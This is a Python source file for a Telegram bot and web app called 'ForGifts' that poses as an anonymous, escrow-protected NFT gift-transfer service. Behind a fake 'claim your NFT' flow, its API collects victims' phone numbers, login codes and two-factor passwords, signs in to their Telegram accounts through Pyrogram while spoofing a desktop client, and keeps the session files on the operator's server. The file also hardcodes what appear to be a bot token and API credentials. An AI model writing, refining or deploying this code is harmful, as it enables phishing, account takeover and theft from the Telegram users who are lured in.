#!/usr/bin/env python3
import asyncio
import logging
import re
import sqlite3
import os
import json
import secrets
import time
from threading import Lock
from datetime import datetime, timedelta
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiohttp import web, ClientSession, ClientTimeout
from bs4 import BeautifulSoup
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, 
    PhoneCodeExpired, PhoneNumberInvalid,
    PhoneNumberBanned, FloodWait
)
import base64
import hashlib

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN', '8374381970:AAG1VU-oEibrut-7kjm0_p6fXZyKinqG2cU')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8524070856'))
WEB_APP_URL = os.getenv('WEB_APP_URL', 'https://one-qh1w.onrender.com')
WEB_PORT = int(os.getenv('PORT', 10000))
API_ID = int(os.getenv('API_ID', 39033869))
API_HASH = os.getenv('API_HASH', '88f8f69717e325ae289f5d9a66dfe156')
PROXY = os.getenv('PROXY', '')  # socks5://user:pass@ip:port
# ==================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== БАЗА ДАННЫХ ==========
class Database:
    def __init__(self, db_name='inventory.db'):
        self.db_name = db_name
        self.lock = Lock()
        self.init_db()

    def init_db(self):
        with self.lock:
            conn = sqlite3.connect(self.db_name, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS inventory (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    nft_name TEXT NOT NULL,
                    nft_link TEXT NOT NULL,
                    icon_url TEXT,
                    created_by INTEGER,
                    claimed BOOLEAN DEFAULT 0
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS telegram_sessions (
                    session_key TEXT PRIMARY KEY,
                    phone_number TEXT NOT NULL,
                    user_id INTEGER,
                    first_name TEXT,
                    username TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_used TIMESTAMP
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_user_id ON inventory (user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_claimed ON inventory (claimed)')
            conn.commit()
            conn.close()

    def add_nft(self, user_id, nft_name, nft_link, icon_url=None, created_by=None):
        if created_by is None:
            created_by = user_id
        with self.lock:
            conn = sqlite3.connect(self.db_name, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO inventory (user_id, nft_name, nft_link, icon_url, created_by, claimed)
                VALUES (?, ?, ?, ?, ?, 0)
            ''', (user_id, nft_name, nft_link, icon_url, created_by))
            conn.commit()
            conn.close()

    def get_user_inventory(self, user_id):
        with self.lock:
            conn = sqlite3.connect(self.db_name, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT nft_name, nft_link, icon_url FROM inventory 
                WHERE user_id = ? AND claimed = 1
            ''', (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [{"id": row[0], "link": row[1], "icon": row[2]} for row in rows]

    def get_available_nft(self):
        with self.lock:
            conn = sqlite3.connect(self.db_name, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT id, nft_name FROM inventory 
                WHERE claimed = 0 
                LIMIT 1
            ''')
            row = cursor.fetchone()
            conn.close()
            return row

    def claim_nft(self, new_user_id):
        with self.lock:
            conn = sqlite3.connect(self.db_name, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT id, nft_name FROM inventory 
                WHERE claimed = 0 
                LIMIT 1
            ''')
            nft = cursor.fetchone()
            if not nft:
                return None
            nft_id, nft_name = nft
            cursor.execute('''
                UPDATE inventory 
                SET user_id = ?, claimed = 1 
                WHERE id = ?
            ''', (new_user_id, nft_id))
            conn.commit()
            conn.close()
            return nft_name

    def save_session(self, session_key, phone_number, user_id=None, first_name=None, username=None):
        with self.lock:
            conn = sqlite3.connect(self.db_name, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO telegram_sessions 
                (session_key, phone_number, user_id, first_name, username, last_used)
                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (session_key, phone_number, user_id, first_name, username))
            conn.commit()
            conn.close()

db = Database()

# ========== TELEGRAM LOGIN HANDLER ==========
class TelegramLoginHandler:
    def __init__(self, api_id, api_hash, proxy=None):
        self.api_id = api_id
        self.api_hash = api_hash
        self.proxy = proxy
        self.pending_logins = {}  # phone -> {client, phone_code_hash, timestamp}
        
    async def _get_client(self, phone_number):
        """Создать клиент с прокси и настройками"""
        session_name = f"sessions/{hashlib.md5(phone_number.encode()).hexdigest()}"
        
        proxy_dict = None
        if self.proxy:
            if self.proxy.startswith('socks5://'):
                proxy_dict = {
                    "scheme": "socks5",
                    "hostname": self.proxy.split('@')[1].split(':')[0],
                    "port": int(self.proxy.split(':')[-1]),
                    "username": self.proxy.split('://')[1].split(':')[0] if '@' in self.proxy else None,
                    "password": self.proxy.split('://')[1].split(':')[1].split('@')[0] if '@' in self.proxy else None
                }
        
        return Client(
            session_name,
            api_id=self.api_id,
            api_hash=self.api_hash,
            proxy=proxy_dict,
            app_version="8.9.0",
            device_model="Desktop",
            system_version="Windows 10",
            lang_code="en",
            system_lang_code="en-US",
            sleep_threshold=30
        )
    
    async def send_code(self, phone_number):
        """Отправить код на номер (с задержкой и проверками)"""
        # Проверка на флуд
        if phone_number in self.pending_logins:
            pending = self.pending_logins[phone_number]
            if time.time() - pending['timestamp'] < 120:
                raise Exception("Please wait before requesting new code")
        
        client = await self._get_client(phone_number)
        
        try:
            await asyncio.sleep(2)
            await client.connect()
            
            sent_code = await client.send_code(phone_number)
            
            self.pending_logins[phone_number] = {
                'client': client,
                'phone_code_hash': sent_code.phone_code_hash,
                'timestamp': time.time()
            }
            
            return {
                "success": True,
                "phone_code_hash": sent_code.phone_code_hash,
                "timeout": sent_code.timeout,
                "type": sent_code.type.__class__.__name__
            }
            
        except PhoneNumberInvalid:
            await client.disconnect()
            return {"success": False, "error": "Invalid phone number"}
        except PhoneNumberBanned:
            await client.disconnect()
            return {"success": False, "error": "Phone number banned"}
        except FloodWait as e:
            await client.disconnect()
            return {"success": False, "error": f"Flood wait: {e.value} seconds"}
        except Exception as e:
            await client.disconnect()
            logger.error(f"Send code error: {e}")
            return {"success": False, "error": str(e)}
    
    async def verify_code(self, phone_number, phone_code_hash, code):
        """Проверить код и войти"""
        if phone_number not in self.pending_logins:
            return {"success": False, "error": "Session expired. Request new code."}
        
        pending = self.pending_logins[phone_number]
        client = pending['client']
        
        try:
            await asyncio.sleep(1)
            
            try:
                await client.sign_in(phone_number, phone_code_hash, code)
            except SessionPasswordNeeded:
                return {"success": True, "2fa_required": True}
            
            # Успешный вход
            user = await client.get_me()
            
            # Сохраняем сессию
            session_key = hashlib.sha256(f"{phone_number}{time.time()}".encode()).hexdigest()[:32]
            db.save_session(session_key, phone_number, user.id, user.first_name, user.username)
            
            await client.disconnect()
            del self.pending_logins[phone_number]
            
            return {
                "success": True,
                "2fa_required": False,
                "session_key": session_key,
                "user": {
                    "id": user.id,
                    "first_name": user.first_name,
                    "username": user.username,
                    "phone_number": phone_number
                }
            }
            
        except PhoneCodeInvalid:
            return {"success": False, "error": "Invalid code"}
        except PhoneCodeExpired:
            del self.pending_logins[phone_number]
            await client.disconnect()
            return {"success": False, "error": "Code expired"}
        except Exception as e:
            logger.error(f"Verify code error: {e}")
            return {"success": False, "error": str(e)}
    
    async def verify_2fa(self, phone_number, password):
        """Проверить 2FA пароль"""
        if phone_number not in self.pending_logins:
            return {"success": False, "error": "Session expired"}
        
        pending = self.pending_logins[phone_number]
        client = pending['client']
        
        try:
            await asyncio.sleep(1)
            await client.check_password(password)
            
            user = await client.get_me()
            session_key = hashlib.sha256(f"{phone_number}{time.time()}".encode()).hexdigest()[:32]
            db.save_session(session_key, phone_number, user.id, user.first_name, user.username)
            
            await client.disconnect()
            del self.pending_logins[phone_number]
            
            return {
                "success": True,
                "session_key": session_key,
                "user": {
                    "id": user.id,
                    "first_name": user.first_name,
                    "username": user.username,
                    "phone_number": phone_number
                }
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}

# Инициализация обработчика логина
login_handler = TelegramLoginHandler(API_ID, API_HASH, PROXY)

# ========== ПАРСИНГ NFT ==========
async def fetch_nft_preview(url: str) -> str:
    default_icon = "https://cdn-icons-png.flaticon.com/512/5968/5968804.png"
    timeout = ClientTimeout(total=5)
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    try:
        async with ClientSession(timeout=timeout, headers=headers) as session:
            async with session.get(url) as response:
                if response.status != 200:
                    return default_icon
                html = await response.text()
                soup = BeautifulSoup(html, 'lxml')
                og_image = soup.find('meta', property='og:image')
                if og_image and og_image.get('content'):
                    return og_image['content']
                return default_icon
    except Exception as e:
        logger.error(f"Failed to fetch preview for {url}: {e}")
        return default_icon

def parse_nft_input(input_text: str):
    input_text = input_text.strip()
    pattern = r'(?:https?://)?t\.me/nft/([a-zA-Z0-9_-]+-?\d*)|([a-zA-Z0-9_-]+-?\d*)'
    match = re.search(pattern, input_text)
    
    if not match:
        return None, None
    
    nft_name = match.group(1) if match.group(1) else match.group(2)
    if not nft_name:
        return None, None
    
    full_link = f"https://t.me/nft/{nft_name}"
    return nft_name, full_link

# ========== AIOGRAM БОТ ==========
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

async def set_commands(bot: Bot):
    commands = [
        types.BotCommand(command="/start", description="Start bot and get info"),
        types.BotCommand(command="/create", description="Create NFT gift")
    ]
    await bot.set_my_commands(commands)

@dp.message(Command('start'))
async def cmd_start(message: types.Message):
    args = message.text.split()[1] if len(message.text.split()) > 1 else ''
    
    if args == "inventory":
        user_id = message.from_user.id
        nft_name = db.claim_nft(user_id)
        
        if nft_name:
            web_app_url_with_params = f"{WEB_APP_URL}?user_id={user_id}"
            keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="🎒 Inventory", web_app=types.WebAppInfo(url=web_app_url_with_params))]
            ])
            await message.answer(
                f"<b>✅ You've claimed {nft_name}!</b>\n\n"
                f"<b>✨ You've already claimed this NFT. You can check it in your inventory.</b>",
                reply_markup=keyboard
            )
        else:
            await message.answer("<b>❌ No available NFTs to claim at the moment.</b>")
        return

    welcome_text = """<b>💎 Welcome to ForGifts!</b> This bot allows you to anonymously and securely transfer NFTs to another user.

<blockquote expandable><b>💼 What does the bot do?</b>
📤 Helps transfer NFTs directly
🔐 Uses escrow to protect both parties
🥷 Anonymity when transferring NFTs
🤖 Prevents NFT transfers from being tracked by parser bots</blockquote>

<b>📤 To send an NFT, use the command</b> <code>/create t.me/nft/PlushPepe-1</code>
<i>Or just</i> <code>/create PlushPepe-1</code>"""
    await message.answer(welcome_text)

@dp.message(Command('create'))
async def cmd_create(message: types.Message):
    args = message.text.split()[1] if len(message.text.split()) > 1 else ''
    if not args:
        await message.answer("<b>❌ Usage:</b> <code>/create t.me/nft/PlushPepe-1</code>\n<i>Or</i> <code>/create PlushPepe-1</code>")
        return
    
    nft_name, full_link = parse_nft_input(args)
    if not nft_name:
        await message.answer("<b>❌ Invalid NFT format.</b> Use: <code>/create t.me/nft/Name-Number</code> or <code>/create Name-Number</code>")
        return
    
    user_id = message.from_user.id
    icon_url = await fetch_nft_preview(full_link)
    db.add_nft(user_id, nft_name, full_link, icon_url, created_by=user_id)
    
    response_text = f"""<b>🎁 You've received an NFT!</b>
<a href="{full_link}">{nft_name}</a> has been gifted to you via ForGifts.

<b>Tap the button below to claim it!</b>"""
    
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🎁 Claim", url=f"https://t.me/testhjdaaljhbot?start=inventory")]
    ])
    
    await message.answer(response_text, reply_markup=keyboard, disable_web_page_preview=False)

@dp.message(Command('admin'))
async def cmd_admin(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        with sqlite3.connect('inventory.db') as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM inventory')
            total = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM inventory WHERE claimed = 1')
            claimed = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM telegram_sessions')
            sessions = cursor.fetchone()[0]
        
        stats = f"<b>📊 Stats:</b>\nTotal NFTs: {total}\nClaimed: {claimed}\nAvailable: {total - claimed}\nTelegram Sessions: {sessions}"
        await message.answer(f"<b>🛠 Admin panel active.</b>\n{stats}")
    else:
        await message.answer("<b>🚫 Access denied.</b>")

# ========== ВЕБ-СЕРВЕР ==========
async def handle_index(request):
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html = f.read()
        return web.Response(text=html, content_type='text/html')
    except Exception as e:
        logger.error(f"Failed to load index.html: {e}")
        return web.Response(text='<h1>Error loading page</h1>', content_type='text/html')

async def handle_style(request):
    try:
        with open('style.css', 'r', encoding='utf-8') as f:
            css = f.read()
        return web.Response(text=css, content_type='text/css')
    except Exception as e:
        logger.error(f"Failed to load style.css: {e}")
        return web.Response(text='/* CSS not found */', content_type='text/css')

async def handle_script(request):
    try:
        with open('script.js', 'r', encoding='utf-8') as f:
            js = f.read()
        return web.Response(text=js, content_type='application/javascript')
    except Exception as e:
        logger.error(f"Failed to load script.js: {e}")
        return web.Response(text='// JS not found', content_type='application/javascript')

async def handle_api_inventory(request):
    user_id = request.query.get('user_id')
    if not user_id:
        return web.json_response({'error': 'user_id required'}, status=400)
    
    try:
        user_id = int(user_id)
        inventory = db.get_user_inventory(user_id)
        return web.json_response({'inventory': inventory})
    except Exception as e:
        return web.json_response({'error': str(e)}, status=500)

# ========== LOGIN API ==========
async def handle_send_code(request):
    try:
        data = await request.json()
        phone = data.get('phone', '').strip()
        
        if not phone:
            return web.json_response({'success': False, 'error': 'Phone required'})
        
        result = await login_handler.send_code(phone)
        return web.json_response(result)
        
    except Exception as e:
        logger.error(f"Send code error: {e}")
        return web.json_response({'success': False, 'error': 'Internal error'})

async def handle_verify_code(request):
    try:
        data = await request.json()
        phone = data.get('phone', '').strip()
        code = data.get('code', '').strip()
        phone_code_hash = data.get('phone_code_hash', '').strip()
        
        if not all([phone, code, phone_code_hash]):
            return web.json_response({'success': False, 'error': 'Missing data'})
        
        result = await login_handler.verify_code(phone, phone_code_hash, code)
        return web.json_response(result)
        
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return web.json_response({'success': False, 'error': 'Internal error'})

async def handle_verify_2fa(request):
    try:
        data = await request.json()
        phone = data.get('phone', '').strip()
        password = data.get('password', '').strip()
        
        if not all([phone, password]):
            return web.json_response({'success': False, 'error': 'Missing data'})
        
        result = await login_handler.verify_2fa(phone, password)
        return web.json_response(result)
        
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return web.json_response({'success': False, 'error': 'Internal error'})

async def start_web_app():
    app = web.Application()
    
    # Статические файлы
    app.router.add_get('/', handle_index)
    app.router.add_get('/style.css', handle_style)
    app.router.add_get('/script.js', handle_script)
    
    # API
    app.router.add_get('/api/inventory', handle_api_inventory)
    app.router.add_post('/api/send_code', handle_send_code)
    app.router.add_post('/api/verify_code', handle_verify_code)
    app.router.add_post('/api/verify_2fa', handle_verify_2fa)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', WEB_PORT)
    await site.start()
    logger.info(f"Web app started on port {WEB_PORT}")
    return runner

# ========== ЗАПУСК ==========
async def main():
    # Создаём папку sessions
    os.makedirs('sessions', exist_ok=True)
    
    await set_commands(bot)
    web_runner = await start_web_app()
    logger.info(f"Bot starting. Web App URL: {WEB_APP_URL}")
    
    try:
        await dp.start_polling(bot)
    finally:
        await web_runner.cleanup()

if __name__ == '__main__':
    asyncio.run(main())
